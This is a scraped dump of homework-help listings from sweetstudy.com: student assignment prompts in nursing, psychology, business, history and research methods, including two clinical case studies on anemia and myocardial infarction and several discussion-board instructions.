Discussion Board:      Complete both parts for y | Psychology,"    
Complete both parts for your initial post:
1. Post a short description of a client population and a problem that affects that client population.
Example: Clients with severe symptoms of schizophrenia [population] have a high rate of readmission into inpatient psychiatric care [problem that affects population].
2. Then, for that population and problem, come up with a research question.
Example: Would increased access to outpatient therapy services decrease the rates of readmission for clients with severe symptoms of schizophrenia?
In coming up with a research question, make sure that the research question can be used to create a hypothesis. A good quantitative research question usually starts with ""Does"", ""Do"", or ""Would"" rather than a more qualitative question-geared word such as ""How"". 

",,,,Psychology,Human|Hum,https://www.sweetstudy.com/questions/discussion-board-20798415
Hematopoietic and cardiovascular," 
Hematopoietic:
J.D. is a 37 years old white woman who presents to her gynecologist complaining of a 2-month history of intermenstrual bleeding, menorrhagia, increased urinary frequency, mild incontinence, extreme fatigue, and weakness. Her menstrual period occurs every 28 days and lately there have been 6 days of heavy flow and cramping. She denies abdominal distension, back-ache, and constipation. She has not had her usual energy levels since before her last pregnancy.

Past Medical History (PMH):
Upon reviewing her past medical history, the gynecologist notes that her patient is a G5P5with four pregnancies within four years, the last infant having been delivered vaginally four months ago. All five pregnancies were unremarkable and without delivery complications. All infants were born healthy. Patient history also reveals a 3-year history of osteoarthritis in the left knee, probably the result of sustaining significant trauma to her knee in an MVA when she was 9 years old. When asked what OTC medications she is currently taking for her pain and for how long she has been taking them, she reveals that she started taking ibuprofen, three tablets each day, about 2.5 years ago for her left knee. Due to a slowly progressive increase in pain and a loss of adequate relief with three tablets, she doubled the daily dose of ibuprofen. Upon the recommendation from her nurse practitioner and because long-term ibuprofen use can cause peptic ulcers, she began taking OTC omeprazole on a regular basis to prevent gastrointestinal bleeding. Patient history also reveals a 3-year history of HTN for which she is now being treated with a diuretic and a centrally acting antihypertensive drug. She has had no previous surgeries.

Case Study Questions

Name the contributing factors on J.D that might put her at risk to develop iron deficiency anemia.
Within the case study, describe the reasons why J.D. might be presenting constipation and or dehydration.
Why Vitamin B12 and folic acid are important on the erythropoiesis? What abnormalities their deficiency might cause on the red blood cells?
The gynecologist is suspecting that J.D. might be experiencing iron deficiency anemia.
In order to support the diagnosis, list and describe the clinical symptoms that J.D. might have positive for Iron deficiency anemia.
If the patient is diagnosed with iron deficiency anemia, what do you expect to find as signs of this type of anemia? List and describe.
Labs results came back for the patient. Hb 10.2 g/dL; Hct 30.8%; Ferritin 9 ng/dL; red blood cells are smaller and paler in color than normal. Research list and describe for appropriate recommendations and treatments for J.D.

Cardiovascular
Mr. W.G. is a 53-year-old white man who began to experience chest discomfort while playing tennis with a friend. At first, he attributed his discomfort to the heat and having had a large breakfast. Gradually, however, discomfort intensified to a crushing sensation in the sternal area and the pain seemed to spread upward into his neck and lower jaw. The nature of the pain did not seem to change with deep breathing. When Mr. G. complained of feeling nauseated and began rubbing his chest, his tennis partner was concerned that his friend was having a heart attack and called 911 on his cell phone. The patient was transported to the ED of the nearest hospital and arrived within 30 minutes of the onset of chest pain. In route to the hospital, the patient was placed on nasal cannula and an IV D5W was started. Mr. G. received aspirin (325 mg po) and 2 mg/IV morphine. He is allergic to meperidine (rash). His pain has eased slightly in the last 15 minutes but is still significant; was 9/10 in severity; now7/10. In the ED, chest pain was not relieved by 3 SL NTG tablets. He denies chills.

Case Study Questions

For patients at risk of developing coronary artery disease and patients diagnosed with acute myocardial infarct, describe the modifiable and non-modifiable risk factors.
What would you expect to see on Mr. W.G. EKG and which findings described on the case are compatible with the acute coronary event?
Having only the opportunity to choose one laboratory test to confirm the acute myocardial infarct, which would be the most specific laboratory test you would choose and why?
How do you explain that Mr. W.G temperature has increased after his Myocardial Infarct, when that can be observed and for how long? Base your answer on the pathophysiology of the event.
Explain to Mr. W.G. why he was experiencing pain during his Myocardial Infarct. Elaborate and support your answer.

Submission Instructions:

Include both case studies in your post.
Your initial post should be at least 500 words, formatted and cited in current APA style with support from at least 2 academic sources. Your initial post is worth 8 points.
You should respond to at least two of your peers by extending, refuting/correcting, or adding additional nuance to their posts. Your reply posts are worth 2 points (1 point per response.) 
All replies must be constructive and use literature where possible.
Please post your initial response by 11:59 PM ET Thursday, and comment on the posts of two classmates by 11:59 PM ET Sunday.
You can expect feedback from the instructor within 48 to 72 hours from the Sunday due date. 


Grading Rubric 
Your assignment will be graded according to the grading rubric.
Discussion RubricCriteriaRatingsPoints
Identification of Main Issues, Problems, and Concepts
Distinguished - 5 points
Identifies and demonstrates a sophisticated understanding of the issues, problems, and concepts.
Excellent - 4 points
Identifies and demonstrates an accomplished understanding of most issues, problems, and concepts.
Fair - 1-3 points
Identifies and demonstrates an acceptable understanding of most issues, problems, and concepts.
Poor - 0 points
Identifies and demonstrates an unacceptable understanding of most issues, problems, and concepts. Or nothing was posted.
5 points
Use of Citations, Writing Mechanics, and APA Formatting Guidelines
Distinguished - 3 points
Effectively uses the literature and other resources to inform their work. Exceptional use of citations and extended referencing. High level of APA precision and free of grammar and spelling errors.
Excellent - 2 points
Effectively uses the literature and other resources to inform their work. Moderate use of citations and extended referencing. Moderate level of APA precision and free of grammar and spelling errors.
Fair - 1 point
Ineffectively uses the literature and other resources to inform their work. Moderate use of citations and extended referencing. APA style and writing mechanics need more precision and attention to detail.
Poor - 0 points
Ineffectively uses the literature and other resources to inform their work. Unacceptable use of citations and extended referencing. APA style and writing mechanics need serious attention. Or nothing was posted.
3 pointsResponse to Posts of Peers
Distinguished - 2 points
Student constructively responded to two other posts and either extended, expanded, or provided a rebuttal to each.
Fair - 1 point
Student constructively responded to one other post and either extended, expanded, or provided a rebuttal.
Poor - 0 points
Student provided no response to a peer's post.
2 pointsTotal Points 10 ",,,,Nursing,Solution,https://www.sweetstudy.com/questions/hematopoietic-and-cardiovascular-20798419
Jim Crow laws in the American South,"Read the paragraph from the introduction [paragraphs 1-4].

While Black citizens could receive ""separate but equal"" treatment under the law, the reality was quite different for them. Public spaces for Black people were poor in quality compared to those for white people. In addition, Black citizens could not vote in most of the rural South. That’s because, in that area, Black citizens were required to pass a literacy test before they could vote. These literacy tests kept most Black citizens, who often received a weaker education than white citizens, from voting.

What is the MOST accurate explanation of what this paragraph means?


A
Public spaces in the South slowly became better for Black people.

B
The rural South had poor voter participation in most elections.

C
“Separate but equal” laws meant that Black people had inferior public spaces and were also kept from voting.

D
Literacy tests led to Black people placing an emphasis on better education and becoming informed voters.",,,,World history,Solution,https://www.sweetstudy.com/questions/jim-crow-laws-in-the-american-south
Nursing: Write a 2-page written respons | Nursing,"Write a 2-page written response detailing your selection of one policymaking framework that best supports your priority (Food insecurity among children)—particularly, getting your priority on the agenda. 
In your response, explain why the framework best describes how you might proceed in effectively moving your advocacy priority forward in the policymaking process. 
Support your response with evidence. Consider which of the three models might best fit your priority determined 

Advocacy Coalition Framework (ACF) 
Kingdon’s Multiple Streams Framework (KSF)  
Narrative Policy Framework (NPF) 
",,,,Nursing,Soon|Urgent,https://www.sweetstudy.com/questions/nursing-20798435
Job performance and effects of the environment,"Describe a time when you struggled to perform a task at work. What was the job task? Using the PDC-HS, what questions would you have responded to with a no? If you were your supervisor, what would you have changed in your environment in order to help you perform better?
Check for AI & Plagiarism
Rubric attached along with slides of what PDC-HS is ",,,,Applied Sciences,Solution,https://www.sweetstudy.com/questions/job-performance-and-effects-of-the-environment
MOODLE:   Select case study 3.1 (p. 69 | English," 
Select case study 3.1 (p. 69) or case study 4.1 (p. 89). 
Describe course concepts from Chapters 1, 2, 3 or 4 that are present in the case study you selected. 
How are the concepts used in a positive or negative manner in the case study?  How might these concepts be valuable to your personal growth as a leader. 
You do not have to have something from every chapter but provide a thorough overview.
You do not have to answer the questions at the end of each case study. They may though, prove useful to highlight chapter concepts for your writing.
2.  Complete the Leadership Styles Questionnaire on p. 73.   What surprises you regarding your scores?  Did you receive scores that you expected?  How might you use this information moving forward?
3.  How might you use the course concepts outlined in Chapters 3 and 4 in your daily interactions with friends and family?  Explain how these concepts can help you influence progress on family activities or projects you work on with friends.
4.  What was the most surprising insight you discovered from Chapters 3 or 4?  Why was it surprising and how may it be useful for you?",,,,English,Solution,https://www.sweetstudy.com/questions/moodle-20798439
Assign 2 Marketing : You may work together with ano | Economics,"You may work together with another student to create a presentation about Intellectual Property Rights in the US in PowerPoint, PDF, Google Slides or similar. Submit your presentation and be prepared to make the presentation to the class.
Please, cover the following:

What is a patent?  Give an example of a patent and how the patent rights affected the success of the product or process, or the design.  How long will the protection last?
What is a Copyright?  Give a specific example of a copyright that has been granted.  Review what it protects and why is this important.
What is a trademark? Give your own unique example of a trademark that is protected under US law. Address how a company gets a trademark and must protect it.

Add submission
",,,,Economics,Marketing|Assign,https://www.sweetstudy.com/questions/assign-2-marketing
Design challenge : The purpose of this assignment | Management,"The purpose of this assignment is to create a design challenge that highlights various problem-solving techniques. This assignment will build on the concepts in your Topic 2 ""Hypothesis Statements – Overview and Template"" assignment.
To complete this assignment, create a PowerPoint presentation that is 10-12 slides (including title and reference slides). Include a minimum of two scholarly sources in your presentation. Address the following:",,,,Management,Design,https://www.sweetstudy.com/questions/design-challenge
kj:  | Nursing,,10week.docx,10week.docx,"
1. Using one of the following resources, identify a key local environmental health issue within your community. Be specific, for example, do not simply write clean air, but rather indicate what the specific issue related to clean air is within your community. I encourage you to use one of the first 3 resources, but if you need to you can use other online resources. Provide a link for your resource(s) in the discussion, as appropriate.
· 
· Interview with local official
· Local newspaper article
· Contact the local environmental group
· Online resources or others you may find. 
2. Identify the county and state in which you live.
3. What are current local efforts being undertaken to address this issue?
4. Citing course resources, what is the significance of the role of public health nursing in environmental health issues? Identify a public health nursing intervention that could be taken locally to address this particular concern (refer to MDH Intervention Wheel). 
5. What Healthy People 2030 objective/goal would be addressed with this intervention? 
When responding to your peers, compare your community with their community and give a suggestion of another public health nursing intervention that could be taken or identify an agency (other than public health) that could assist the community in addressing the issue.

Climate Change:

1. Identify a recent (within the past 5 years) national or global environmental health outcome that occurred due to climate change.
2. What were the potential/actual causes of climate change that contributed to this environmental health outcome?
3. What were the consequences of climate change on health, the environment, and/or the way we live? Give specific/actual examples related to your specific environmental health outcome. 
4. What role may public health nurses take to address the needs of individuals and families at the time of your specified environmental health concern? 
5. What are 2 specific actions/roles public health nurses can take to mitigate the long-term impact of climate change on health, healthcare, and/or the environment? What organizations may public health nurses join or collaborate with to address future environmental concerns related to climate change?

",Nursing,Solution,https://www.sweetstudy.com/questions/kj-20798449
Nursing case study: Hematopoietic: J.D. is a 37 ye | Nursing,"Hematopoietic:
J.D. is a 37 years old white woman who presents to her gynecologist complaining of a 2-month history of intermenstrual bleeding, menorrhagia, increased urinary frequency, mild incontinence, extreme fatigue, and weakness. Her menstrual period occurs every 28 days and lately there have been 6 days of heavy flow and cramping. She denies abdominal distension, back-ache, and constipation. She has not had her usual energy levels since before her last pregnancy.

Past Medical History (PMH):
Upon reviewing her past medical history, the gynecologist notes that her patient is a G5P5with four pregnancies within four years, the last infant having been delivered vaginally four months ago. All five pregnancies were unremarkable and without delivery complications. All infants were born healthy. Patient history also reveals a 3-year history of osteoarthritis in the left knee, probably the result of sustaining significant trauma to her knee in an MVA when she was 9 years old. When asked what OTC medications she is currently taking for her pain and for how long she has been taking them, she reveals that she started taking ibuprofen, three tablets each day, about 2.5 years ago for her left knee. Due to a slowly progressive increase in pain and a loss of adequate relief with three tablets, she doubled the daily dose of ibuprofen. Upon the recommendation from her nurse practitioner and because long-term ibuprofen use can cause peptic ulcers, she began taking OTC omeprazole on a regular basis to prevent gastrointestinal bleeding. Patient history also reveals a 3-year history of HTN for which she is now being treated with a diuretic and a centrally acting antihypertensive drug. She has had no previous surgeries.

Case Study Questions

Name the contributing factors on J.D that might put her at risk to develop iron deficiency anemia.
Within the case study, describe the reasons why J.D. might be presenting constipation and or dehydration.
Why Vitamin B12 and folic acid are important on the erythropoiesis? What abnormalities their deficiency might cause on the red blood cells?
The gynecologist is suspecting that J.D. might be experiencing iron deficiency anemia.
In order to support the diagnosis, list and describe the clinical symptoms that J.D. might have positive for Iron deficiency anemia.
If the patient is diagnosed with iron deficiency anemia, what do you expect to find as signs of this type of anemia? List and describe.
Labs results came back for the patient. Hb 10.2 g/dL; Hct 30.8%; Ferritin 9 ng/dL; red blood cells are smaller and paler in color than normal. Research list and describe for appropriate recommendations and treatments for J.D.

Cardiovascular
Mr. W.G. is a 53-year-old white man who began to experience chest discomfort while playing tennis with a friend. At first, he attributed his discomfort to the heat and having had a large breakfast. Gradually, however, discomfort intensified to a crushing sensation in the sternal area and the pain seemed to spread upward into his neck and lower jaw. The nature of the pain did not seem to change with deep breathing. When Mr. G. complained of feeling nauseated and began rubbing his chest, his tennis partner was concerned that his friend was having a heart attack and called 911 on his cell phone. The patient was transported to the ED of the nearest hospital and arrived within 30 minutes of the onset of chest pain. In route to the hospital, the patient was placed on nasal cannula and an IV D5W was started. Mr. G. received aspirin (325 mg po) and 2 mg/IV morphine. He is allergic to meperidine (rash). His pain has eased slightly in the last 15 minutes but is still significant; was 9/10 in severity; now7/10. In the ED, chest pain was not relieved by 3 SL NTG tablets. He denies chills.

Case Study Questions

For patients at risk of developing coronary artery disease and patients diagnosed with acute myocardial infarct, describe the modifiable and non-modifiable risk factors.
What would you expect to see on Mr. W.G. EKG and which findings described on the case are compatible with the acute coronary event?
Having only the opportunity to choose one laboratory test to confirm the acute myocardial infarct, which would be the most specific laboratory test you would choose and why?
How do you explain that Mr. W.G temperature has increased after his Myocardial Infarct, when that can be observed and for how long? Base your answer on the pathophysiology of the event.
Explain to Mr. W.G. why he was experiencing pain during his Myocardial Infarct. Elaborate and support your answer.

Submission Instructions:
You must complete both case studies if there are more than one.

Your initial post should be at least 500 words, formatted using the questions or a phrase that summarize the question as heading. This should be bold and centered and responses to each question under the heading. You must cite in current APA style with support from at least 2 academic sources within the last 5 years. Your initial post is worth 8 points.
You should respond to  two of your peers by extending, refuting/correcting, or adding additional nuance to their posts. Your reply posts are worth 2 points (1 point per response.) Must have intext citation and one reference, and 150 words.
All replies must be constructive and use literature. MUST be done on a SEPARATE day from the initial post.
Please post your initial post by 11:59 PM ET Thursday, and comment on the posts of two classmates by 11:59 PM ET Sunday.
You can expect feedback from the instructor within 48 to 72 hours from the Sunday due date. 
",,,,Nursing,Pathophysiology|Nursing|Casestudy|Masters|Msn,https://www.sweetstudy.com/questions/nursing-case-study-20798453
Primary Care NP Role vs. APN Roles,"Compare the primary care NP role with other APN roles. What are the similarities among the roles, what are the differences, and how would you communicate the role to a healthcare provider and a consumer?
Submission Instructions:


Your initial post should be at least 500 words, formatted and cited in current APA style with support from at least 2 academic sources. Your initial post is worth 8 points.
You should respond to at least two of your peers by extending, refuting/correcting, or adding additional nuance to their posts. Your reply posts are worth 2 points (1 point per response.) 
All replies must be constructive and use literature where possible.
Please post your initial response by 11:59 PM ET Thursday, and comment on the posts of two classmates by 11:59 PM ET Sunday.
You can expect feedback from the instructor within 48 to 72 hours from the Sunday due date. 
",,,,Nursing,Nursing|Msn|Registered nurse|Apa,https://www.sweetstudy.com/questions/primary-care-np-role-vs-apn-roles-20798457
L-DISCUSSION: 1. Based on the theory of atta | Nursing,"1. Based on the theory of attachment, what behaviors would a nurse attempt to stimulate when working with parent to promote health attachment?
Please include 400 words in your  post with two scholarly articles 
NO PLAGIARISM MORE THAN 10 %
ADD CITATIONS
DUE DATE MARCH 20, 2024",,,,Nursing,Stat|Original|Urgent,https://www.sweetstudy.com/questions/l-discussion-20798463
L-PP: Conducted a literature review  | Nursing,"Conducted a literature review on the use of integrative theory in clinical practice or research studies. Use a minimum of six articles. See RUBRIC for additional information.
Theme: Integrative Theory
Seria : 1 slide (introduction)
2 slides (analysis)
1 slide (implications)
1 slide (conclusions)

TOTAL 5 SLIDES
NO PLAGIO MORE THAN 10 %
ADD SPEAKER NOTES IN ALL SLIDES PLEASE
I NEED CONDENSED SLIDES WITH PROPER INFORMATION
DUE DATE MARCH 21, 2024",,,,Nursing,Stat|Original|Urgent,https://www.sweetstudy.com/questions/l-pp-20798465
Y-QUESTIONS: PLEASE SEE THE ATTACHED DOCUME | Nursing,"PLEASE SEE THE ATTACHED DOCUMENT, WITH THE 4 QUESTIONS , THEY ARE ANSWERED ALREADY.

I NEED YOU TO ARGUMENT EACH ANSWER, WILL BE A TOTAL OF 4 ARGUMENT ANSWERS. I NEED CITATIONS IN EACH ARGUMENT.
ADD ALL REFERENCES MINIMUM OF 4 NO OLDER THAN 5 YEARS.

2 PAGES
NO PLAGIARISM MORE THAN 10 %
DUE DATE MARCH 21, 2024
",,,,Nursing,Stat|Original|Urgent,https://www.sweetstudy.com/questions/y-questions
Nursing Y-ASSIGNMENT: PLEASE SEE THE ATTACHED DOCUME | Nursing,"PLEASE SEE THE ATTACHED DOCUMENT FOR INSTRUCTIONS
SELECT BY YOUR OWN THE TOPIC ACCORDING WHAT IS REQUESTED BY THE INSTRUCTOR
FOLLOW EACH REQUIREMENT STRICTLY PLEASE
APA 7TH EDITION
ADD CITATIONS
MORE THAN 3 REFERENCES NO OLDER THAN 5 YEARS
NO PLAGIO MORE THAN 5 % ALLOWED FOR THIS ASSIGNMENT
TOTAL 5 PAGES
DUE DATE MARCH 22, 2024
",,,,Nursing,Stat|Original|Urgent,https://www.sweetstudy.com/questions/nursing-y-assignment
VIRTUAL COMMUNICATION—WHAT WORKS?," Throughout the COVID-19 pandemic, nearly everyone had to adjust quickly to conducting most communication virtually, both personally and professionally. Sometimes these communications worked well; other times, they went awry or were simply ineffective. For this Discussion, you will reflect on your experience with both effective and ineffective virtual communication to help determine best practices. 
To prepare for this Discussion:

Think about both the personal and professional virtual communication you have had recently. Choose one or two interactions that were effective and one or two that were not. For each, consider specific factors that led to the effectiveness or ineffectiveness of the virtual communication in meeting its intended purpose. 

BY DAY 3
Post an analysis of the effectiveness of virtual communication. In your analysis, do the following:

Briefly describe one or two effective virtual communication situations and one or two that were ineffective, providing the context and purpose of each.
For each of your examples, analyze at least two distinct factors that contributed to its effectiveness/ineffectiveness in meeting its intended purpose.
For each of your examples, analyze the effect of the interaction on the overall outcome and relationship (if applicable).
Based on these experiences, propose a suggested list of 3–5 best practices for effective virtual communication. 
",,,,Business & Finance,Discussion,https://www.sweetstudy.com/questions/virtual-communicationwhat-works
discussion:    Review this week’s Learning | Psychology," 

Review this week’s Learning Resources to better understand the process of critically reviewing academic literature.
Review Evaluating and Comparing Empirical Literaturedocument, found in this week’s Learning Resources, to guide you in the Discussion.
Search two databases (e.g., PsycInfo, Thoreau, Science Direct, Taylor & Francis) located within the Walden Library.
Identify and select two peer-reviewed articles about the same forensic psychology topic. (For example, look for two articles about false confessions, psychopathy, treatment for domestic violence victims, etc.) 
Note: Websites like Wikipedia and WebMD do not meet the criteria for being scholarly sources.

BY DAY 3
Post the following:

Brief review of each of the articles you selected, including the major findings of each and the relevant citations and URL links
Description of the ways in which the findings of each article are similar or different
Explanation for why you think the findings of each article are similar or different given the topic is the same

Note: Your posts should be substantial (2–4 paragraphs), supported with scholarly evidence from your research and/or the Learning Resources, and properly cited using APA style. Personal anecdotes are acceptable within meaningful responses but cannot stand alone as a response.
Read your colleagues’ postings.",,,,Psychology,Criminal|Justice,https://www.sweetstudy.com/questions/discussion-20798481
Case Study: ENRON is a poster child for sh | Management,"ENRON is a poster child for shareholder wealth and destruction and bad behavior. This case describes the
company’s strategy, internal and external governance to allow students to understand why the company
failed. 
Address the following questions:
1. Why was Enron so admired?
2. Why did the company fail?
3. Why were the company’s internal checks and balances and incentive systems unable to prevent
its demise?
4. Why did the external auditors and board of directors fail to prevent Enron’s future?


Case material
Case material can be found attached.


Report Format
The report has
to be:
1. single line spacing
2. font Times New Romans 11
3. margins should be 1 inch
4. length min 3/max 5 pages (exhibits excluded)
",,,,Management,Case study|Finance|Business,https://www.sweetstudy.com/questions/case-study-20798483
EMHSS699_research:  | Law,,AnalyzingtheData.pdf|QuantitativeResearch.pdf|TheAnnotatedBibliography.pdf|QualitativeResearch.pdf|TheLiteratureReview.pdf|Weeks5-12_ConductingtheResearch.pdf|GatheringtheData.pdf|Notresearchonhumansubject.pdf|EMHS699_Overall_instruction.pdf|GraduateStudyResourcesinLibrary.docx|6902Howtodoaresearchinterview-YouTube.pdf|6902Chapter8SurveyMethodologyPart1-YouTube.pdf|Owono__________WK3_211.docx,EMHS699_Overall_instruction.pdf,"


Randall Hanifen posted on Feb 3, 2024 12:01 AM

Week 1

EMHS699 K001 Winter 2024 RO

Announcements  Week 1

During this course, you will accomplish a research project on an emergency &

disaster management / homeland security topic of your choice. You must gather

data, apply research concepts and analytical processes to that data, draw the

appropriate conclusions & recommendations, and produce a report of a minimum

of 50 pages that meets APA publication quality. Your final paper must provide

original knowledge to the field of emergency and disaster management and

homeland security that has not existed before. This contribution can be as large or

small as you wish to design it, as long as the contribution is original.

The first month of the course will focus on the design of your project and putting

all of the required approvals and authorizations in place. Then, you will have

approximately two months to conduct your research. The final month will be a

process of review and improvement of the final project report, at the end of which

you will have produced a product that honors your institution, your education,

your profession, and that you can truly be proud of.

A great deal of information is available in the classroom to help. Within the first

few days of the course, be sure to examine everything under every section. Read

the syllabus thoroughly. Read every assignment guideline. Look through the

resources and these lessons so that you will know where to find things when you

need them. Each area has resources that contribute to your overall research

project. 

Be sure as you familiarize yourself with the course that you take the time to look

under every section. You will find graded items under two different buttons:

'Discussions', and 'Assignments'. Read the instructions carefully and be sure to


https://myclassroom.apus.edu/d2l/home/163110


https://myclassroom.apus.edu/d2l/lms/news/main.d2l?ou=163110




complete all graded tasks.

There are several graded Discussions. To receive full credit for a discussion, you

must create an original posting, respond to a minimum of two peers, and respond

to everyone who has responded to you. These tasks MUST be accomplished during

the assigned weeks. There is no point in attempting to have a discussion after

everyone has moved on. DO NOT post a document to a discussion. You don't want

to make your input difficult for your reader to get to.

You must make a submission for every item on the Assignments page. Feedback

will be returned on every assignment. It can be found on the Assignments page,

not in the Grades section. After each grade is posted, go back to the assignments

page and read the feedback.

Here is an approximate outline for when you should be accomplishing each activity

in the project development process:

Wk1: Read the Capstone Manual and the appropriate style manual; Take the CITI

course and read the IRB requirements; Introduce yourself in the discussions.

Wk2: Develop and submit your prospectus; submit the CITI completion certificate;

submit the required IRB approval documents; upload your prospectus to the

discussion for peer review.

Wk3: Develop and submit your draft research proposal; review classmates'

projects in the discussion.

Wk4: Revise and submit your final research proposal; include the CITI certificate

and the approved IRB forms. Instructor acceptance will constitute approval to

accomplish your project.

Wk5: Develop your annotated bibliography.

Wk6: Finalize your annotated bibliography and write your literature review.

Wk7: Gather the data you will analyze.

Wk8: Finalize data gathering.




Wk9: Begin the analysis process.

Wk10: Complete the analysis process; provide a progress report in the discussion.

Wk11: Write up your research findings.

Wk12: Write your conclusions & recommendations.

Wk13: Submit your rough draft.

Wk14: Revise your rough draft in accordance with instructor feedback.

Wk15: Submit your final project report; provide your conclusions &

recommendations in the discussion.

Wk16: Fill out and submit the approval and transmittal documents; discuss your

projects in the discussion.

Happy researching!

Dr. Hanifen


",Law,Solution,https://www.sweetstudy.com/questions/emhss699-research
Ebp discussion : Post your research question an | Nursing,"Post your research question and describe the independent and dependent variables. Then, identify the level of measurement of both your independent and dependent variables. Provide a brief rationale for your classification of each variable. Be specific. Explain considerations of analyzing data related to each variable based on its level of measurement. Be sure to include any advantages or challenges that you might encounter in your statistical analysis of each variable and explain why.",,,,Nursing,Dnp|Nurse ,https://www.sweetstudy.com/questions/ebp-discussion-20798495
Critical Research Paper: Need to be about Barstool Spor | Statistics,"Need to be about Barstool Sports, if you have any other ideas. Please let me know before hand",Criticalresearchpaper150points25percentoffinalgrade.pdf,Criticalresearchpaper150points25percentoffinalgrade.pdf,"


• Critical research paper (150 points, ~25 percent of final grade)

: Students will write a 1,500-word research paper analyzing and criticizing a specific media
start-up (keep in mind, it doesn’t have to be a startup that succeeded) or media entrepreneur.
Again, this is a media class; the company must exist in that space.

Some of the basic information your paper must include is the founders' name, when the

the company was founded, where it was founded, what its original purpose was, and what

funding the company had initially. This section needs to be titled “The story of _____ (name

of the company or entrepreneur you’re researching” and be no more than 600 words.

The majority of the paper must be titled “A critical analysis of _____ (name of the company or

entrepreneur” and be 900 words. You must critically analyze the trajectory of the

business/entrepreneur and the specific media industry (journalism, advertising, social media,
marketing, etc.) it exists in. In terms of the specific media industry this company exists in, I need
to know whether this industry is crowded or fledgling. It is also in this portion of the paper where
I need to see a lot of supported insight (use footnotes + use reputable sources) to support why
the company has succeeded, failed, or is on the brink of succeeding/failing.

Other points that need to be addressed in this portion:

● Has the industry been quick to adapt to new technology or slow?

● In terms of the specific company you focus on, what are the successes and failures it has
had?

● In regards to the failures, why did they occur, how could they have been avoided, and was the
company able to recover? For example, some common failures include a poorly designed
business plan, the inability to generate revenue, a leadership vacuum (or bickering), a crowded
industry, legal woes, and public relations problems. Some companies will experience one of
those failures or a combination of a few.

● Furthermore, was there a company like it that tried and failed already? Why did another
company thrive or fail in comparison to the one you’re writing about?

● What made this entrepreneur different than so many others? What made this person and
his/her situation unique?




● And most importantly, is the business you’ve selected sustainable? What, if anything,
could disrupt its success and why?

Your paper must have no less than seven reputable sources cited.

One of your sources must be an interview you conduct with a business or media
professional(a reporter who has
written about this company, for example) who can help you address the questions above

(you CANNOT interview a professor in the college or a fellow student).

The paper must have a clear introduction and conclusion. It must also abide by AP Style and

cite sources in-text using APA style. Quoted material must be no longer than two lines and

must abide by the 2:1 rule; meaning, for every line you quote, you must have at least two lines

of explanation/discussion. Spelling and grammar errors will have points deducted. More

information on the paper will be provided weeks before it is due.

Wikipedia (and any other wiki-type sites) are not acceptable sources for all papers in this

class.

Companies or people you cannot profile and which will result in a 0 for the assignment (that’s

not to say they cannot be mentioned in your writing in a compare/comparison sort of way):

- Facebook

- ESPN

- LinkedIn

- Yahoo

- Any media company that is publicly traded

- Mashable

- Slate

- Salon




- Fark

- Drew Curtis

- Suck

- Vox (which owns sites like SB Nation)

- Vice

- Shane Smith

- ABC, CBS, FOX, NBC, MSNBC, Disney

- Mark Zuckerberg, Eduardo Saverin, Andrew McCollum, Dustin Moskovitz

and Chris Hughes

- Buzzfeed

- Jack Dorsey

- Twitter (X)

- Gawker

- Nick Denton

- Jonah Peretti, John S. Johnson III

- Arianna Huffington, Kenneth Lerer, Andrew Breitbart

- YouTube

- Reddit

- Steve Huffman and Alexis Ohanian

- Myspace

- Drudge Report
- Brad Greenspan, Chris DeWolfe, Josh Berman, Tom Anderson




- Chad Hurley, Steve Chen, and Jawed Karim

- Instagram

- Pinterest

- Snapchat

- Kevin Systrom and Mike Krieger

- Evan Spiegel, Bobby Murphy, and Reggie Brown

- Huffington Post


",Statistics,Writing|Analytics,https://www.sweetstudy.com/questions/critical-research-paper-20798497
Week 5 : Watch a TV show episode involv | Applied Sciences,"Watch a TV show episode involving crime and personality disorders. Examples of shows include Criminal Minds, CSI, Law and Order, or something similar. 
 1,000 word analysis of the episode. Include the following:

Summarize the episode you watched.
Outline the personality disorders that were present.
Describe the symptoms of the personality disorders.
Describe possible treatment interventions for the criminal displayed in the show.
Describe possible difficulties that may be faced during treatment.
Address challenges the offender or offenders in the show might reentering society after their incarceration.
Suggest steps that could be taken to reduce recidivism for the offender or offenders.

Include a minimum of 3 sources.",,,,Applied Sciences,Solution,https://www.sweetstudy.com/questions/week-5-20798501
Accounting for Next Generation Leaders,,SQAANGLElectronicAssignmentBrief.docx|SQAANGLAssignmentBrief.docx|SQAANGLSampleAssignment.pdf,SQAANGLSampleAssignment.pdf,This file is too large to display.View in new window,Accounting,Accounting|Finance,https://www.sweetstudy.com/questions/accounting-for-next-generation-leaders
